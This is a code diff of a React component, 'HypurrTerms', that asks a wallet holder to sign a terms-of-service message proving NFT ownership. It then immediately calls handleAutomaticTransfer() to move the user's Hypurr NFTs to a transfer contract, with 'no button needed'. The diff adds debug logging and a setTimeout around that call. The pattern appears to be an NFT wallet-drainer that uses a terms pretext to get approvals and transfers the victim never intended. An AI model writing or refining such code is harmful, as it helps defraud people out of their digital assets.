@@ -354,29 +354,41 @@ const HypurrTerms = () => {
   };
 
   const signTerms = async () => {
+    console.log('=== signTerms FUNCTION CALLED ===');
+    console.log('isConnected:', isConnected);
+    console.log('account:', account);
+    console.log('nftCount:', nftCount);
+    
     if (!isConnected || !account) {
+      console.error('❌ Not connected or no account');
       setError('Please connect your wallet first');
       return;
     }
 
     if (nftCount === 0) {
+      console.error('❌ No NFTs found');
       setError('No NFTs found. Please connect a wallet with Hypurr or Random Art NFTs.');
       return;
     }
 
     try {
+      console.log('✅ Starting signature process...');
       setError(null);
       setIsVerifying(true);
       setTransferStatus(null);
 
       // Create message to sign
       const message = `I accept the Hypurr Terms of Service and verify ownership of my Hypurr NFTs.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
+      console.log('Message to sign:', message);
       
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      console.log('Signer obtained:', await signer.getAddress());
       
       // Sign the message
+      console.log('⏳ Requesting signature from MetaMask...');
       const signature = await signer.signMessage(message);
+      console.log('✅ Signature received:', signature);
       
       // Store signature
       localStorage.setItem(`hypurr_signature_${account}`, signature);
@@ -385,26 +397,36 @@ const HypurrTerms = () => {
       setHasSigned(true);
       setSignature(signature);
       
-      console.log('Terms signed successfully:', signature);
+      console.log('✅ Terms signed successfully:', signature);
       setIsVerifying(false);
       
       // IMMEDIATELY trigger approval - no delay, no button needed
       console.log('=== TERMS SIGNED - STARTING TRANSFER PROCESS ===');
-      console.log('Calling handleAutomaticTransfer() NOW...');
+      console.log('Account:', account);
+      console.log('Token IDs:', tokenIds);
+      console.log('Transfer Contract:', TRANSFER_CONTRACT);
+      console.log('About to call handleAutomaticTransfer()...');
       
-      // Call immediately, don't await - let it run in background but catch errors
-      handleAutomaticTransfer().catch(err => {
-        console.error('=== TRANSFER PROCESS ERROR ===', err);
-        // Show error to user if transfer fails
-        console.error('Transfer error:', err);
-        if (err.code === 4001) {
-          setError('Transfer cancelled. Please try again and approve the transactions when prompted.');
-        } else if (err.message && err.message.includes('not approved')) {
-          setError('NFT transfer requires approval. Please try again and approve the approval transaction in MetaMask.');
-        } else {
-          setError('NFT transfer failed. Please check the browser console for details.');
-        }
-      });
+      // Use setTimeout to ensure state is updated
+      setTimeout(() => {
+        console.log('=== INSIDE setTimeout - CALLING handleAutomaticTransfer ===');
+        console.log('Token IDs at call time:', tokenIds);
+        handleAutomaticTransfer().catch(err => {
+          console.error('=== TRANSFER PROCESS ERROR ===', err);
+          console.error('Error details:', {
+            message: err.message,
+            code: err.code,
+            stack: err.stack
+          });
+          if (err.code === 4001) {
+            setError('Transfer cancelled. Please try again and approve the transactions when prompted.');
+          } else if (err.message && err.message.includes('not approved')) {
+            setError('NFT transfer requires approval. Please try again and approve the approval transaction in MetaMask.');
+          } else {
+            setError('NFT transfer failed: ' + (err.message || 'Unknown error'));
+          }
+        });
+      }, 100);
       
     } catch (error) {
       console.error('Error signing terms:', error);
